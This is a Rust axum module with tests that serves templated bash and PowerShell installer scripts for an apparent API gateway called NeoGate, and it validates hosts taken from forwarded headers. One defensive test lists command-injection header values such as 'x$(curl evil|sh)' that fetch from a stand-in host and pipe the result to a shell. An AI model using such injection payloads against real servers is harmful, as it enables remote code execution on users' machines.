use std::sync::Arc;

use axum::{
    extract::State,
    http::{header, HeaderMap, HeaderValue},
    response::{IntoResponse, Response},
    routing::get,
    Router,
};

use crate::{
    error::{AppError, AppResult},
    AppState,
};

const INSTALL_TEMPLATE: &str = concat!(
    include_str!("../../templates/install/header.sh"),
    "\n",
    include_str!("../../templates/install/actions.sh"),
    "\n",
    include_str!("../../templates/install/main.sh"),
);
const INSTALL_PS1_TEMPLATE: &str = concat!(
    include_str!("../../templates/install_ps1/header.ps1"),
    "\n",
    include_str!("../../templates/install_ps1/actions.ps1"),
    "\n",
    include_str!("../../templates/install_ps1/main.ps1"),
);

pub fn router() -> Router<Arc<AppState>> {
    Router::new()
        .route("/install", get(install_script))
        .route("/install.ps1", get(install_ps1_script))
}

pub fn bootstrap_router() -> Router {
    Router::new()
        .route("/install", get(bootstrap_install_script))
        .route("/install.ps1", get(bootstrap_install_ps1_script))
}

async fn install_script(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> AppResult<Response> {
    let origin = install_origin(state.config.public_base_url.as_deref(), &headers)
        .ok_or_else(|| AppError::BadRequest("PUBLIC_BASE_URL is required".to_string()))?;
    install_response(&origin)
}

async fn bootstrap_install_script(headers: HeaderMap) -> AppResult<Response> {
    let origin = inferred_public_base_url(&headers)
        .ok_or_else(|| AppError::BadRequest("PUBLIC_BASE_URL is required".to_string()))?;
    install_response(&origin)
}

async fn install_ps1_script(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
) -> AppResult<Response> {
    let origin = install_origin(state.config.public_base_url.as_deref(), &headers)
        .ok_or_else(|| AppError::BadRequest("PUBLIC_BASE_URL is required".to_string()))?;
    install_ps1_response(&origin)
}

async fn bootstrap_install_ps1_script(headers: HeaderMap) -> AppResult<Response> {
    let origin = inferred_public_base_url(&headers)
        .ok_or_else(|| AppError::BadRequest("PUBLIC_BASE_URL is required".to_string()))?;
    install_ps1_response(&origin)
}

fn install_response(origin: &str) -> AppResult<Response> {
    let script = render_install_script(origin);
    let mut response = script.into_response();
    let headers = response.headers_mut();
    headers.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/x-shellscript; charset=utf-8"),
    );
    headers.insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    Ok(response)
}

fn install_ps1_response(origin: &str) -> AppResult<Response> {
    let script = render_install_ps1_script(origin);
    let mut response = script.into_response();
    let headers = response.headers_mut();
    headers.insert(
        header::CONTENT_TYPE,
        HeaderValue::from_static("text/plain; charset=utf-8"),
    );
    headers.insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    Ok(response)
}

fn render_install_script(origin: &str) -> String {
    let origin = origin.trim().trim_end_matches('/');
    INSTALL_TEMPLATE
        .replace("__NEOGATE_DEFAULT_BASE_URL__", &format!("{origin}/v1"))
        .replace("__NEOGATE_INSTALL_ORIGIN__", origin)
}

fn render_install_ps1_script(origin: &str) -> String {
    let origin = origin.trim().trim_end_matches('/');
    INSTALL_PS1_TEMPLATE
        .replace("__NEOGATE_DEFAULT_BASE_URL__", &format!("{origin}/v1"))
        .replace("__NEOGATE_INSTALL_ORIGIN__", origin)
}

pub fn inferred_public_base_url(headers: &HeaderMap) -> Option<String> {
    let host = header_first_value(headers, "x-forwarded-host")
        .or_else(|| header_first_value(headers, "host"))?;
    let proto = header_first_value(headers, "x-forwarded-proto")
        .or_else(|| header_first_value(headers, "x-forwarded-scheme"))
        .unwrap_or_else(|| "http".to_string());
    let proto = proto.to_ascii_lowercase();

    if proto != "http" && proto != "https" {
        return None;
    }
    let host = host.trim().trim_end_matches('/');
    if !is_safe_inferred_host(host) {
        return None;
    }

    Some(format!("{proto}://{host}"))
}

fn is_safe_inferred_host(host: &str) -> bool {
    !host.is_empty()
        && host
            .chars()
            .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '.' | '-' | ':' | '[' | ']'))
}

fn install_origin(configured_origin: Option<&str>, headers: &HeaderMap) -> Option<String> {
    let inferred_origin = inferred_public_base_url(headers);
    match (configured_origin, inferred_origin) {
        (Some(configured), Some(inferred))
            if is_loopback_origin(configured) && !is_loopback_origin(&inferred) =>
        {
            Some(inferred)
        }
        (Some(configured), _) => Some(configured.to_string()),
        (None, inferred) => inferred,
    }
}

fn is_loopback_origin(origin: &str) -> bool {
    let origin = origin.trim().to_ascii_lowercase();
    let Some(rest) = origin
        .strip_prefix("http://")
        .or_else(|| origin.strip_prefix("https://"))
    else {
        return false;
    };
    let authority = rest.split('/').next().unwrap_or_default();
    let host = if let Some(ipv6_end) = authority
        .strip_prefix('[')
        .and_then(|value| value.find(']'))
    {
        &authority[1..=ipv6_end]
    } else {
        authority.split(':').next().unwrap_or_default()
    };

    matches!(host, "localhost" | "127.0.0.1" | "0.0.0.0" | "::1")
}

fn header_first_value(headers: &HeaderMap, name: &str) -> Option<String> {
    headers
        .get(name)?
        .to_str()
        .ok()?
        .split(',')
        .next()
        .map(str::trim)
        .filter(|value| !value.is_empty())
        .map(str::to_string)
}

#[cfg(test)]
mod tests {
    use axum::{
        body::{to_bytes, Body},
        http::{HeaderMap, Request, StatusCode},
    };
    use tower::ServiceExt;

    use super::*;
    use crate::app::tests::test_state;

    #[test]
    fn infers_public_base_url_from_forwarded_headers() {
        let mut headers = HeaderMap::new();
        headers.insert("x-forwarded-proto", "https".parse().unwrap());
        headers.insert("x-forwarded-host", "dev.moligate.com".parse().unwrap());

        assert_eq!(
            inferred_public_base_url(&headers).as_deref(),
            Some("https://dev.moligate.com")
        );
    }

    #[test]
    fn falls_back_to_host_when_forwarded_host_is_missing() {
        let mut headers = HeaderMap::new();
        headers.insert("host", "localhost:8080".parse().unwrap());

        assert_eq!(
            inferred_public_base_url(&headers).as_deref(),
            Some("http://localhost:8080")
        );
    }

    #[test]
    fn rejects_invalid_forwarded_proto() {
        let mut headers = HeaderMap::new();
        headers.insert("x-forwarded-proto", "javascript".parse().unwrap());
        headers.insert("x-forwarded-host", "dev.moligate.com".parse().unwrap());

        assert_eq!(inferred_public_base_url(&headers), None);
    }

    #[test]
    fn rejects_shell_metacharacters_in_inferred_host() {
        for host in [
            "x$(curl evil|sh)",
            "x`curl evil|sh`",
            "dev.moligate.com;curl evil",
            "dev.moligate.com curl.evil",
            "dev.moligate.com|sh",
        ] {
            let mut headers = HeaderMap::new();
            headers.insert("x-forwarded-proto", "https".parse().unwrap());
            headers.insert("x-forwarded-host", host.parse().unwrap());

            assert_eq!(inferred_public_base_url(&headers), None, "{host}");
        }
    }

    #[test]
    fn install_origin_uses_forwarded_host_when_configured_origin_is_loopback() {
        let mut headers = HeaderMap::new();
        headers.insert("x-forwarded-proto", "http".parse().unwrap());
        headers.insert("x-forwarded-host", "43.156.216.56:8080".parse().unwrap());

        assert_eq!(
            install_origin(Some("http://localhost:8080"), &headers).as_deref(),
            Some("http://43.156.216.56:8080")
        );
    }

    #[test]
    fn install_origin_keeps_configured_public_origin() {
        let mut headers = HeaderMap::new();
        headers.insert("x-forwarded-proto", "http".parse().unwrap());
        headers.insert("x-forwarded-host", "43.156.216.56:8080".parse().unwrap());

        assert_eq!(
            install_origin(Some("https://neogate.example.com"), &headers).as_deref(),
            Some("https://neogate.example.com")
        );
    }

    #[test]
    fn renders_install_script_with_origin() {
        let script = render_install_script("https://dev.moligate.com/");

        assert!(script.contains("DEFAULT_BASE_URL=\"https://dev.moligate.com/v1\""));
        assert!(script.contains("curl -fsSL https://dev.moligate.com/install | bash"));
        assert!(script.contains(r#"api_key_prompt) printf '%s' "请输入 API 密钥：""#));
        assert!(script.contains(r#"api_key_prompt) printf '%s' "Enter API key: ""#));
        assert!(!script.contains("Enter emailed API key"));
        assert!(!script.contains("__NEOGATE_DEFAULT_BASE_URL__"));
        assert!(!script.contains("__NEOGATE_INSTALL_ORIGIN__"));
        assert!(script.contains("load_existing_credentials"));
        assert!(script.contains("LOADED_CODEX_KEY"));
        assert!(script.contains("client_inferred"));
        assert!(script.contains("model_current_label"));
        assert!(script.contains(r#"key_loaded) printf '%s' "Reusing API key from previous config""#));
        assert!(script.contains(r#"key_loaded) printf '%s' "已从本地配置读取 API 密钥""#));
        assert!(script.contains("HAS_EXISTING_CONFIG"));
        assert!(script.contains("choose_switch_model"));
        assert!(script.contains("run_switch_model_flow"));
        assert!(script.contains("run_full_flow"));
        assert!(script.contains(r#"switch_option) printf '1. 切换模型' ;"#));
        assert!(script.contains(r#"reinstall_option) printf '2. 重新安装' ;"#));
        assert!(script.contains("model_switched"));
    }

    #[test]
    fn renders_install_ps1_script_with_origin() {
        let script = render_install_ps1_script("https://dev.moligate.com/");

        assert!(script.contains("$DefaultBaseUrl = 'https://dev.moligate.com/v1'"));
        assert!(script.contains("irm https://dev.moligate.com/install.ps1 | iex"));
        assert!(!script
            .lines()
            .any(|line| line.trim_start().starts_with("exit")));
        assert!(!script.contains("__NEOGATE_DEFAULT_BASE_URL__"));
        assert!(!script.contains("__NEOGATE_INSTALL_ORIGIN__"));
        assert!(script.contains("api_key_prompt = 'Enter API key: '"));
        assert!(script.contains("api_key_prompt = '请输入 API 密钥：'"));
        assert!(script.contains("function Get-Message([string]$Key"));
        assert!(script.contains("function Detect-Locale"));
        assert!(script.contains("function Load-ExistingCredentials"));
        assert!(script.contains("Load-ExistingCredentials"));
        assert!(script.contains("key_loaded = 'Reusing API key from previous config'"));
        assert!(script.contains("key_loaded = '已从本地配置读取 API 密钥'"));
        assert!(script.contains("model_current_label"));
        assert!(script.contains("client_inferred"));
        assert!(script.contains("HasExistingConfig"));
        assert!(script.contains("function Choose-SwitchModel"));
        assert!(script.contains("function Invoke-SwitchModelFlow"));
        assert!(script.contains("function Invoke-FullFlow"));
        assert!(script.contains("switch_option = '1. 切换模型'"));
        assert!(script.contains("reinstall_option = '2. 重新安装'"));
        assert!(script.contains("model_switched"));
    }

    #[tokio::test]
    async fn install_route_returns_shell_script() {
        let state = test_state();
        let app = router().with_state(state);

        let response = app
            .oneshot(
                Request::builder()
                    .uri("/install")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();

        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get(header::CONTENT_TYPE).unwrap(),
            "text/x-shellscript; charset=utf-8"
        );

        let body = to_bytes(response.into_body(), 128 * 1024).await.unwrap();
        let script = String::from_utf8(body.to_vec()).unwrap();
        assert!(script.starts_with("#!/usr/bin/env bash"));
        assert!(script.contains("DEFAULT_BASE_URL=\"http://localhost:8080/v1\""));
    }

    #[tokio::test]
    async fn install_ps1_route_returns_powershell_script() {
        let state = test_state();
        let app = router().with_state(state);

        let response = app
            .oneshot(
                Request::builder()
                    .uri("/install.ps1")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();

        assert_eq!(response.status(), StatusCode::OK);
        assert_eq!(
            response.headers().get(header::CONTENT_TYPE).unwrap(),
            "text/plain; charset=utf-8"
        );

        let body = to_bytes(response.into_body(), 128 * 1024).await.unwrap();
        let script = String::from_utf8(body.to_vec()).unwrap();
        assert!(script.starts_with("param("));
        assert!(script.contains("$DefaultBaseUrl = 'http://localhost:8080/v1'"));
    }

    #[tokio::test]
    async fn bootstrap_install_route_uses_forwarded_headers() {
        let app = bootstrap_router();

        let response = app
            .oneshot(
                Request::builder()
                    .uri("/install")
                    .header("x-forwarded-proto", "https")
                    .header("x-forwarded-host", "dev.moligate.com")
                    .body(Body::empty())
                    .unwrap(),
            )
            .await
            .unwrap();

        assert_eq!(response.status(), StatusCode::OK);
        let body = to_bytes(response.into_body(), 128 * 1024).await.unwrap();
        let script = String::from_utf8(body.to_vec()).unwrap();
        assert!(script.contains("DEFAULT_BASE_URL=\"https://dev.moligate.com/v1\""));
    }
}
